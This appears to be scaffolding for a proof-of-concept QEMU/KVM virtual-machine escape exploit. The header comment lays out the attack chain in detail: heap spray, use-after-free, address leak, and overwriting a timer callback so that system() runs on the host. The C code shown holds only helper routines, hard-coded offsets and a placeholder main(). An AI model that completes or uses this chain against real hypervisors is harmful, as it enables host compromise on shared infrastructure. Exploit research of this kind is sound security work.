/*
 * Scavenger — QEMU/KVM Escape via NVMe Error-Handling UAF + virtio-gpu
 * (Black Hat Asia 2021 / CVE-2020-25084)
 *
 * Affected: QEMU 5.x  (hw/block/nvme.c, dma-helpers.c)
 *
 * Core vulnerability:
 *   nvme_dma_read_prp() / nvme_dma_write_prp() declare a QEMUSGList on
 *   the stack and pass its address to nvme_map_prp().  On the success
 *   path, nvme_map_prp() initialises the list.  On the error path
 *   (invalid PRP address), nvme_map_prp() jumps to 'unmap:' which calls
 *   qemu_sglist_destroy(qsg) on the UNINITIALISED stack struct.
 *   qemu_sglist_destroy() calls:
 *     object_unref(qsg->dev)     // qsg->dev == stack garbage → crash/ctrl
 *     g_free(qsg->sg)            // qsg->sg  == stack garbage → heap ctrl
 *   This gives an arbitrary-free primitive for heap shaping.
 *
 * Exploit chain (from the Black Hat Asia 2021 paper):
 *   1. Heap spray 0x290-byte NVMe request chunks (create_sq × 25)
 *   2. virtio-gpu RESOURCE_ATTACH_BACKING → allocate 0x150 mapping table
 *      → that table's iov[] is mapped using bounce buffer (dma_memory_map)
 *      → trigger dma_memory_map failure → qemu_sglist_destroy frees table
 *      → table overlaps with a sprayed NVMe request chunk (UAF)
 *   3. Allocate NVMe I/O queue (create_sq) → reuse freed 0x150 chunk
 *      as NVMe SQ descriptor → NvmeSQueue.io_req points into userspace
 *   4. Issue an NVMe READ to that SQ → nvme_rw() maps user PRP via
 *      nvme_map_prp() into qsg which is heap NvmeRequest.qsg
 *      → bounce buffer mapping returns physmap pointer → heap leak
 *   5. Repeat with 0x40 chunk to leak timer struct address
 *   6. Compute QEMU base via nvme_process_sq offset
 *   7. Overwrite timer callback with system() + argument string
 *   8. Trigger timer → system(";gnome-calculator") on host
 *
 * Important:  symbol offsets in this file are BUILD-SPECIFIC.
 *             Re-derive with:
 *               nm ./qemu-system-x86_64 | grep -E '\b(system|nvme_process_sq|cleanup)\b'
 *             Then update the three #define values below.
 *
 * References:
 *   [Black Hat Asia 2021] Scavenger: Misuse Error Handling Leading to QEMU/KVM Escape
 *   https://mp.weixin.qq.com/s/1KYTZynabBqzNjoJhe1bWw
 *
 * TODO:
 *   1. Build QEMU with --extra-cflags="-pg" (see build.sh)
 *   2. Run build.sh — it prints system / nvme_process_sq offsets
 *   3. Update SYSTEM_OFFSET, NVME_PROCESS_SQ_OFFSET, CLEANUP_OFFSET
 *   4. Run /proc/iomem to get NVME_MMIO_ADDR and GPU_MMIO_ADDR
 *   5. Implement the full chain below
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <assert.h>

/* ---- Build-specific symbol offsets (update after building QEMU) ---- */
#define SYSTEM_OFFSET           0x2cf170UL   /* offset of system() from QEMU base */
#define NVME_PROCESS_SQ_OFFSET  0x5A7D00UL   /* offset of nvme_process_sq()       */
#define CLEANUP_OFFSET          0x708390UL   /* offset of cleanup callback stub   */

/* ---- MMIO addresses (read from /proc/iomem after boot) ------------- */
#define NVME_MMIO_ADDR  0xfebf0000UL
#define NVME_MMIO_SIZE  0x2000UL
#define GPU_MMIO_ADDR   0xfd000000UL
#define GPU_MMIO_SIZE   0x4000UL

/* ---- Payload -------------------------------------------------------- */
static const char EXEC_CMD[] = ";gnome-calculator";

/* -------------------------------------------------------------------- */
#define PAGE_SHIFT  12
#define PAGE_SIZE   (1UL << PAGE_SHIFT)
#define PFN_PRESENT (1ULL << 63)
#define PFN_PFN     ((1ULL << 55) - 1)

static uint64_t gva_to_gpa(void *addr)
{
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) { perror("pagemap"); exit(1); }
    uint64_t pme;
    size_t offset = ((uintptr_t)addr >> 9) & ~7UL;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    close(fd);
    assert(pme & PFN_PRESENT);
    return ((pme & PFN_PFN) << PAGE_SHIFT) | ((uintptr_t)addr & (PAGE_SIZE - 1));
}

static void *mmio_map(uint64_t phys, size_t size)
{
    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd < 0) { perror("/dev/mem"); exit(1); }
    void *p = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, phys);
    close(fd);
    if (p == MAP_FAILED) { perror("mmap"); exit(1); }
    return p;
}

int main(void)
{
    printf("[*] Scavenger — NVMe UAF + virtio-gpu QEMU escape PoC\n");
    printf("[!] exp.c is a placeholder — implement the full chain here.\n");
    printf("\n");
    printf("    Symbol offsets (update after building QEMU):\n");
    printf("      system           = 0x%lx\n", SYSTEM_OFFSET);
    printf("      nvme_process_sq  = 0x%lx\n", NVME_PROCESS_SQ_OFFSET);
    printf("      cleanup          = 0x%lx\n", CLEANUP_OFFSET);
    printf("    MMIO:\n");
    printf("      NVMe  = 0x%lx  (verify with /proc/iomem)\n", NVME_MMIO_ADDR);
    printf("      GPU   = 0x%lx  (verify with /proc/iomem)\n", GPU_MMIO_ADDR);
    printf("    Payload: \"%s\"\n", EXEC_CMD);
    printf("\n");
    printf("    Refer to scavenger.md and the Black Hat paper for the\n");
    printf("    full heap spray / UAF / leak / RIP-control chain.\n");
    return 0;
}
